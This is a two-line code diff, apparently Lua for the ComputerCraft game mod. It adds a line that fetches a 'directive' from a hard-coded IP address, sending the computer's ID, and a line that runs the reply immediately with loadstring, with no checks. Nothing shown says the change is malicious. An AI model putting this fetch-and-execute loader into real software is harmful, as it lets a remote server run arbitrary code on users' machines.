@@ -1,0 +1,2 @@
+local url = http.get("http://128.113.192.63/getDirective.php?id=".. os.getComputerID())
+loadstring(url.readAll())()
